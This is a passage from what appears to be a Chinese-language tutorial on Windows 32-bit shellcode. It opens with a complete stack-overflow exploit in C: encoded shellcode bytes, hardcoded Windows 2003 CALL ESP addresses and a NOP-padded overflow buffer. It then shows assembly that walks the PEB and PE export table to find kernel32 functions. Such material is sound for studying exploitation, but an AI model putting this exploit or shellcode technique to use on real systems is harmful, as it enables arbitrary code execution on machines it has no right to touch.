class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="comment">/* 287=0x11f bytes */</span></span><br><span class="line"><span class="string">&quot;\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\x08\x01\x80\x34\x0b\xfe\xe2&quot;</span></span><br><span class="line"><span class="string">&quot;\xfa\xc3\xe8\xeb\xff\xff\xff\x96\x9b\x86\x9b\xfe\x96\x8e\x9f\x9a&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x96\x90\x91\x8a\x9b\x75\x02\x96\xa9\x98\xf3\x01\x96\x9d\x77&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\xb1\x96\x37\x42\x58\x95\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e\xa4&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\xb0\xfe\xfe\xfe\x75\x26\x16\xfb\xfe\xfe\xfe\x17\x30\xfe\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\xaf\xac\xa8\xa9\xab\x75\x12\x75\x29\x7d\x12\xaa\x75\x02\x94&quot;</span></span><br><span class="line"><span class="string">&quot;\xea\xa7\xcd\x3e\x77\xfa\x71\x1c\x05\x38\xb9\xee\xba\x73\xb9\xee&quot;</span></span><br><span class="line"><span class="string">&quot;\xa9\xae\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\xac\x94&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\x01\x28\x7d\x06\xfe\x8a\xfd\xae\x01\x2d\x75\x1b\xa3\xa1\xa0&quot;</span></span><br><span class="line"><span class="string">&quot;\xa4\xa7\x3d\xa8\xad\xaf\xac\x16\xef\xfe\xfe\xfe\x7d\x06\xfe\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\xf9\x75\x26\x16\xe9\xfe\xfe\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f\xce&quot;</span></span><br><span class="line"><span class="string">&quot;\xfe\xfe\xfe\x75\xbe\xf2\x75\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xbd\xc2\x75\xba\xe6\x86\xfd\x3d\x75\x0e\x75\xb0\xe6\x75\xb8\xde&quot;</span></span><br><span class="line"><span class="string">&quot;\xfd\x3d\x75\xba\x76\x02\xfd\x3d\xa9\x75\x06\x16\xe9\xfe\xfe\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xc5\x3c\x8a\xf8\x1c\x18\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd\x3d&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xba\x76\x02\xfd\x3d\x3d\xad\xaf\xac\xa9\xcd\x2c\xf1\x40\xf9&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\x06\xfe\x8a\xed\x75\x24\x75\x34\x3f\x1d\xe7\x3f\x17\xf9\xf5&quot;</span></span><br><span class="line"><span class="string">&quot;\x27\x75\x2d\xfd\x2e\xb9\x15\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doShellcode</span><span class="params">(<span class="type">char</span> * shellcode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Verify the shellcode by call ((void (*)())shellcode)()&quot;</span>);</span><br><span class="line">    ((<span class="type">void</span> (*)())shellcode)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_LEN 128</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">(<span class="type">char</span>* attackStr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buffer[BUFFER_LEN];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Smash a %d bytes buffer with %d bytes string.\n&quot;</span>, BUFFER_LEN, <span class="built_in">strlen</span>(attackStr));</span><br><span class="line">  <span class="built_in">strcpy</span>(buffer,attackStr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jmp esp address of chinese version</span></span><br><span class="line"><span class="comment">//#define JUMPESP &quot;\x12\x45\xfa\x7f&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMPESP 0x7c99a01b  <span class="comment">// windows2003 sp2 ; sp1=0x7c84fa6a</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALLESP 0x7c81f2df  <span class="comment">// windows2003 sp2 7c81f2df,7c8366e2,7c874303 ; sp1=0x7c806b69  0x7c82334b</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTACK_BUFF_LEN 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFF_SET 132   <span class="comment">// 516=0x204</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">smashStack</span><span class="params">(<span class="type">char</span> * shellcode)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Buff[ATTACK_BUFF_LEN];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *ps;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(Buff, <span class="number">0x90</span>, ATTACK_BUFF_LEN);</span><br><span class="line"></span><br><span class="line">  ps = (<span class="type">unsigned</span> <span class="type">long</span> *)(Buff+OFF_SET);</span><br><span class="line">  *(ps) = CALLESP;</span><br><span class="line">  <span class="built_in">strcpy</span>(Buff+OFF_SET+<span class="number">4</span>+<span class="number">4</span>, shellcode);</span><br><span class="line">  Buff[ATTACK_BUFF_LEN - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  overflow(Buff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//    doShellcode(shellcode); return; //  验证shellcode的正确性</span></span><br><span class="line">  smashStack(shellcode);  <span class="keyword">return</span>;   <span class="comment">//  用shellcode进行缓冲区溢出攻击</span></span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>
<p><strong>知识点：</strong></p>
<ol>
<li>ntdll.dll是Windows系统从ring3到ring0的入口。位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中。</li>
<li>kernel32.dll是非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。</li>
</ol>
<hr>
<h2 id="0x04-win32-shellcode技术"><a href="#0x04-win32-shellcode技术" class="headerlink" title="0x04 win32 shellcode技术"></a>0x04 win32 shellcode技术</h2><pre><code> Windows上一般不使用系统调用来实现shellcode，而是使用Windows API实现。这里的最大障碍在于获得 API 的地址 。由于 ntdll.dll 和 kernel32.dll 总是出现在任何 32 位 进程的地址空间，因此 可以在进程空间中找到动态链接库的加载地址，进而找到其中的输出函数地址。这样就可以使用其中的函数。 
 只要利用 kernel32.dll 中的 LoadLibrary 和GetProcAddress 函数 就可以调用任何动态链接库中的输出函数 。因此 只要在目标进程的内存空间中找到这两个函数的地址，就可以编写实现任何功能的 shellcode。
 以下是一个动态链接库实例：
</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span> <span class="comment">// 例程： UFD_Dll.cpp</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus <span class="comment">// If used by C++ code</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123; <span class="comment">// we need to export the C interface</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	__declspec(dllexport) <span class="function"><span class="type">int</span> __cdecl <span class="title">myPuts</span><span class="params">(<span class="type">char</span> *lpszMsg)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>((<span class="type">char</span> *)lpszMsg); </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	__declspec(dllexport) <span class="function"><span class="type">int</span> __cdecl <span class="title">myPutws</span><span class="params">(LPWSTR lpszMsg)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        _putws(lpszMsg); </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">	__declspec(dllexport) <span class="function"><span class="type">int</span> __cdecl <span class="title">myAdd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;        </span><br><span class="line">	__declspec(dllexport) <span class="function"><span class="type">float</span> __cdecl <span class="title">myMul</span><span class="params">(<span class="type">float</span> a, <span class="type">float</span> b)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a * b;</span><br><span class="line">    &#125;    </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>​    <strong>知识点1：</strong><code>__cdecl</code> 是C Declaration的缩写（declaration，声明），表示C语言默认的函数调用方法：所有参数从右到左依次入栈，这些参数由调用者清除，称为手动清栈。<code>__declspec</code> 用于指定所给定类型的实例的与Microsoft相关的存储方式。</p>
<p>​    之后<code>cl /LD UFD_Dll.cpp</code>生成动态链接库。</p>
<p><img src="/images/win32-shellcode/image-20221129150925406.png" alt="image-20221129150925406" style="zoom:70%;" /></p>
<p>​    然后写一个程序使用刚才生成的动态链接库。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span><span class="comment">// 例程: UseDll.cpp</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(__cdecl * MYPROC)</span><span class="params">(<span class="type">char</span> *)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(__cdecl * MYPROCW)</span><span class="params">(LPWSTR)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(__cdecl * MYADD)</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">float</span><span class="params">(__cdecl * MYMUL)</span><span class="params">(<span class="type">float</span> a, <span class="type">float</span> b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    HINSTANCE hinstLib;</span><br><span class="line">    MYPROC myPuts;</span><br><span class="line">    MYPROCW myPutws;</span><br><span class="line">    MYADD myAdd;</span><br><span class="line">    MYMUL myMul;</span><br><span class="line">    BOOL fFreeResult, fRunTimeLinkSuccess = FALSE;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">64</span>];</span><br><span class="line">    <span class="type">int</span> a=<span class="number">5</span>, b=<span class="number">100</span>; </span><br><span class="line">    <span class="type">float</span> c=<span class="number">5.0</span>, d=<span class="number">100.0</span>;    </span><br><span class="line">    hinstLib = LoadLibrary(TEXT(<span class="string">&quot;UFD_Dll.dll&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(hinstLib != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        myPuts = (MYPROC)GetProcAddress(hinstLib, <span class="string">&quot;myPuts&quot;</span>);</span><br><span class="line">        myPutws = (MYPROCW)GetProcAddress(hinstLib,<span class="string">&quot;myPutws&quot;</span>);</span><br><span class="line">        myAdd = (MYADD)GetProcAddress(hinstLib, <span class="string">&quot;myAdd&quot;</span>);</span><br><span class="line">        myMul = (MYMUL)GetProcAddress(hinstLib, <span class="string">&quot;myMul&quot;</span>);    </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">NULL</span> != myPuts)&#123;</span><br><span class="line">            myPuts(<span class="string">&quot;\nMessage sent to the user defined DLL function.&quot;</span>);  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">NULL</span> != myPutws)&#123;</span><br><span class="line">            myPutws(<span class="string">L&quot; [Unicode] Message sent to the DLL function. \n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The sum (DLL function) of %d and %d is %d.&quot;</span>, a, b, myAdd(a,b));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; The product (DLL function) of %f and %f is %f.&quot;</span>, c, d, myMul(c,d));</span><br><span class="line">        <span class="comment">// Free the DLL module.</span></span><br><span class="line">        fFreeResult = FreeLibrary(hinstLib);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    <strong>知识点2：</strong></p>
<ol>
<li>LPCSTR是Win32和VC++所使用的一种字符串数据类型。LPCSTR被定义成是一个指向以’\0’结尾的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/常量">常量</a>字符的指针。LPWSTR是wchar_t字符串。LPCWSTR是一个指向unicode]编码字符串的32位指针，所指向字符串是wchar型，而不是char型。</li>
<li>HINSTANCE 是“句柄型”数据类型。</li>
</ol>
<p>​    编译并运行：<code>cl UseDll.cpp &amp; UseDll.exe</code></p>
<p><img src="/images/win32-shellcode/image-20221129152542976.png" alt="image-20221129152542976" style="zoom:70%;" /></p>
<p>​    之后输入<code>cl /Fd /Zi UseDll.cpp</code>（<code>/Fd</code>表示重命名程序数据库文件，<code>/Zi</code>表示生成完整的调试信息，<strong>后面<code>windbg</code>要用</strong>）并用<code>windbg</code>加载。</p>
<p><img src="/images/win32-shellcode/image-20221129225118638.png" alt="image-20221129225118638" style="zoom:67%;" /></p>
<p>​    在调用<code>LoadLibraryA</code>之前与之后的代码处设置断点，并查看导入库前后的<code>.imgscan</code></p>
<p><img src="/images/win32-shellcode/image-20221129225418546.png" alt="image-20221129225418546" style="zoom:67%;" /></p>
<p>​    可以看到运行到第2个断点后导入了<code>UFD_Dll.dll</code>库。</p>
<p>​    shellcode是要注入到目标进程中去的，事先并不知道LoadLibrary和GetProcAddress等函数在目标进程中的地址，因此shellcode需要从目标进程中找到这2个函数的地址。</p>
<p>​    当然，如果能从目标进程的内存空间中找到所需函数的地址，就更好了，此时不需要使用LoadLibrary和GetProcAddress这两个函数。</p>
<p>​    <strong>基本设想是从进程空间中找到动态连接库的基址，然后分析PE文件的结构，进而从进程的内存空间中找到所需要的Windows API地址。</strong></p>
<p>​    如何确定动态链接库的基址呢？有两种方法可以从进程空间中确定动态链接库的加载地址，分别是使用<strong>系统结构化异常处理程序</strong>和<strong>使用PEB(进程环境块)</strong>。</p>
<p>​    在此介绍从<strong>PEB(进程环境块)</strong>中获得相关数据结构的方法，这种方法适用于32位的Windows系统。</p>
<p><strong>补充</strong></p>
<ol>
<li><strong>TEB</strong>（Thread Environment Block，线程环境块）系统在此TEB中保存频繁使用的线程相关的数据。位于用户地址空间，在比 PEB 所在地址低的地方。进程中的每个线程都有自己的一个TEB。一个进程的所有TEB都以堆栈的方式，存放在从0x7FFDE000开始的线性内存中，每 4KB为一个完整的TEB，不过该内存区域是向下扩展的。在用户模式下，当前线程的TEB位于独立的4KB段，可通过CPU的FS寄存器来访问该段，一般存储在[FS:0]。在用户态下WinDbg中可用命令$thread取得TEB地址。</li>
<li><strong>PEB</strong>（Process Environment Block，进程环境块）存放进程信息，每个进程都有自己的PEB信息。位于用户地址空间。在Win 2000下，进程环境块的地址对于每个进程来说是固定的，在0x7FFDF000处，这是用户地址空间，所以程序能够直接访问。准确的PEB地址应从系统 的EPROCESS结构的0x1b0偏移处获得，但由于EPROCESS在系统地址空间，访问这个结构需要有ring0的权限。</li>
</ol>
<p><strong>补充完毕！</strong></p>
<p>​    进程运行时的FS:0指向<strong>TEB（线程环境块）</strong>，微软的官方文档给出了如下结构。（FS指的是段寄存器，指向当前活动线程的TEB结构，也叫做线程结构）</p>
<p><img src="/images/win32-shellcode/image-20221129232529776.png" alt="image-20221129232529776" style="zoom:67%;" /></p>
<p>​    <strong>TEB结构的偏移30h地址的双字保存了当前PEB的指针。</strong></p>
<p>​    而PEB的结构是这样的：</p>
<p><img src="/images/win32-shellcode/image-20221129233013774.png" alt="image-20221129233013774" style="zoom:50%;" /></p>
<p>​    在PEB偏移0ch的地址，保存了PEB_LDR_DATA的指针。而PEB_LDR_DATA的数据结构中有LIST_ENTRY数据结构，LIST_ENTRY又有_LIST_ENTRY数据结构。</p>
<p><img src="/images/win32-shellcode/image-20221129234553068.png" alt="image-20221129234553068" style="zoom:67%;" /></p>
<p>​    <strong><code>0xc+0x1c+0x8=0x30</code>说明TEB偏移0x30就是模块基址。</strong>两个0x30，要注意。</p>
<p>​    总结一下：<strong>FS:30h指向当前PEB（进程环境块），PEB+0xc指向PPEB_LDR_DATA，PPEB_LDR_DATA+0x1c指向LIST_ENTRY，LIST_ENTRY+8指向ImageBase。</strong></p>
<p>​    写获得kernel32.dll基址的程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  GetKernelBase.cpp </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">GetKernel32Addr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pAddress;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax, fs:<span class="number">30</span>h     ; PEB base</span><br><span class="line">        mov eax, [eax+<span class="number">0</span>ch]  ; PEB_LER_DATA</span><br><span class="line">        mov ebx, [eax+<span class="number">1</span>ch]      ; The first element </span><br><span class="line">        <span class="comment">// kernel32.dll，如果去掉 mov ebx,[ebx]就是 ntdll.dll</span></span><br><span class="line">        <span class="comment">// 此时ebx为LIST_ENTRY，便可以理解了</span></span><br><span class="line">        mov ebx,[ebx]           ; Next element</span><br><span class="line">        mov eax,[ebx+<span class="number">8</span>]         ; Base address of second module</span><br><span class="line">        mov pAddress,eax        ; Save it to local variable</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Base address of kernel32.dll is %p\n&quot;</span>, pAddress);</span><br><span class="line">    <span class="keyword">return</span> pAddress;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    GetKernel32Addr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    <code>cl GetKernelBase.cpp &amp; GetKernelBase.exe</code>，得到结果：</p>
<p><img src="/images/win32-shellcode/image-20221130104830762.png" alt="image-20221130104830762" style="zoom:110%;" /></p>
<p><img src="/images/win32-shellcode/image-20221130104931448.png" alt="image-20221130104931448" style="zoom:105%;" /></p>
<p>​    可知，kernel32.dll的基址为7c800000，ntdll.dll的基址为7c930000。用windbg调试一哈，确实是这样：</p>
<p><img src="/images/win32-shellcode/image-20221130105327210.png" alt="image-20221130105327210" style="zoom:80%;" /></p>
<p>​    上述程序的具体流程为：</p>
<p><img src="/images/win32-shellcode/image-20221130105440562.png" alt="image-20221130105440562" style="zoom:50%;" /></p>
<p>​    接下来，我们再来获取windows API的地址。</p>
<p>​    为了获取动态库中的Windows API的地址，需要对<strong>PE文件的内存映像</strong>进行分析。从加载地址开始，内存映像存放的是<strong>IMAGE_DOS_HEADER结构</strong>(定义在winnt.h中)。</p>
<p><img src="/images/win32-shellcode/image-20221130115607652.png" alt="image-20221130115607652" style="zoom:80%;" /></p>
<p>​    <strong>补充：PE文件与内存映像</strong></p>
<p><img src="/images/win32-shellcode/image-20221130122011035.png" alt="image-20221130122011035" style="zoom:67%;" /></p>
<p>​    相关博客1：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhcpku/p/14437940.html">https://www.cnblogs.com/zhcpku/p/14437940.html</a></p>
<p>​    相关博客2：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tk091/archive/2012/09/01/2666995.html">https://www.cnblogs.com/tk091/archive/2012/09/01/2666995.html</a>    </p>
<p>​    <strong>补充完毕！</strong></p>
<p>​    e_lfanew表示的是新exe文件头的地址。（<strong>新文件头IMAGE_NT_HEADERS32的偏移地址</strong>）</p>
<p><img src="/images/win32-shellcode/image-20221130120157758.png" alt="image-20221130120157758" style="zoom:70%;" /></p>
<p>​    继续跟进：</p>
<p><img src="/images/win32-shellcode/image-20221130120229629.png" alt="image-20221130120229629" style="zoom:67%;" /></p>
<p>​    再跟进_IMAGE_NT_HEADERS的IMAGE_OPTIONTAL_HEADER32。</p>
<p><img src="/images/win32-shellcode/image-20221130120349100.png" alt="image-20221130120349100" style="zoom:80%;" /></p>
<p>​    可选头optionalHeader 偏移0x60 开始的地址存放了引出表目录数组DataDirectory，默认为16个元素。继续跟进。</p>
<p>​    <img src="/images/win32-shellcode/image-20221130120447374.png" alt="image-20221130120447374" style="zoom:67%;" /></p>
<p>​    一般情况DataDirectory[]是含有16个元素的结构数组。<strong>前两个元素分别对应Export Directory与lmport Directory。</strong> <strong>VirtualAddress头指向IMAGE_EXPORT_DIRECTORY的指针。</strong></p>
<p>​    事实上，从IMAGE_NT_HEADERS32偏移0x18+0x60=0x78可直接得到引出表目录指针DataDirectory。</p>
<p>​    于是，我们继续跟进IMAGE_EXPORT_DIRECTORY。</p>
<p><img src="/images/win32-shellcode/image-20221130121021787.png" alt="image-20221130121021787" style="zoom:67%;" /></p>
<p>​    偏移0x20开始的地址保存<strong>函数名称</strong>(数组)的字符串指针。</p>
<p>​    <strong>总结一波，如何找到Kernel32.dll中的API捏？看下图就明白啦</strong></p>
<p><img src="/images/win32-shellcode/image-20221130122529578.png" alt="image-20221130122529578" style="zoom:67%;" /></p>
<p>​    那我们写如下程序，目的是找到kernel32.dll的第一个函数名及其地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  GetKernel32FuncAddr.cpp : </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">GetKernel32FuncAddr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pBaseOfModule, pNameOfModule;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pAddressOfFunctions, pAddress0fNames;</span><br><span class="line"></span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov edx, fs:<span class="number">30</span>h         ; PEB base</span><br><span class="line">        mov	edx, [edx+<span class="number">0</span>ch]      ; PEB_LER_DATA</span><br><span class="line">        mov edx, [edx+<span class="number">1</span>ch]      ; The first element of InInitOrderModuleList</span><br><span class="line">        <span class="comment">// base of kernel32.dll</span></span><br><span class="line">        mov edx, [edx]          ; Next element</span><br><span class="line">        mov eax, [edx+<span class="number">8</span>]        ; Base address of second module</span><br><span class="line">        mov pBaseOfModule,eax	; Save it to local variable</span><br><span class="line">        mov ebx, eax            ; Base address of kernel32.dll, save it to ebx</span><br><span class="line">        <span class="comment">// get the addrs of first function =========</span></span><br><span class="line">        <span class="comment">// 注意：获得的e_lfanew, DataDirectory[0]是相对地址</span></span><br><span class="line">        mov edx,[ebx+<span class="number">3</span>ch]       ; e_lfanew</span><br><span class="line">        mov edx,[edx+ebx+<span class="number">78</span>h]   ; DataDirectory[<span class="number">0</span>]</span><br><span class="line">        add edx,ebx             ; RVA + base</span><br><span class="line">        mov esi,edx             ; Save first DataDirectory to esi</span><br><span class="line">        <span class="comment">// get fields of IMAGE_EXPORT_DIRECTORY pNameOfModule</span></span><br><span class="line">        mov edx,[esi+<span class="number">0</span>ch]           ; Module Name</span><br><span class="line">        add edx,ebx                 ; RVA + base</span><br><span class="line">        mov pNameOfModule,edx       ; Save it to local variable</span><br><span class="line">        mov edx,[esi+<span class="number">1</span>ch]           ; AddressOfFunctions RVA</span><br><span class="line">        add edx,ebx                 ; RVA + base</span><br><span class="line">        mov pAddressOfFunctions,edx ; Save it to local variable</span><br><span class="line">        mov edx,[esi+<span class="number">20</span>h]       ; AddressOfNames RVA</span><br><span class="line">        add edx,ebx             ; RVA + base</span><br><span class="line">        mov pAddress0fNames,edx ; Save it to local variable</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name of Module:%s\n\tBase of Moudle=%p\n&quot;</span>,</span><br><span class="line">            (<span class="type">char</span> *)pNameOfModule,pBaseOfModule);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First Function:\n\tAddress=0x%p\n\tName=%s\n&quot;</span>,</span><br><span class="line">        (pBaseOfModule + *((<span class="type">unsigned</span> <span class="type">long</span> *) (pAddressOfFunctions))),</span><br><span class="line">        (<span class="type">char</span> *)(pBaseOfModule + *((<span class="type">unsigned</span> <span class="type">long</span> *) (pAddress0fNames)))) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    GetKernel32FuncAddr();</span><br><span 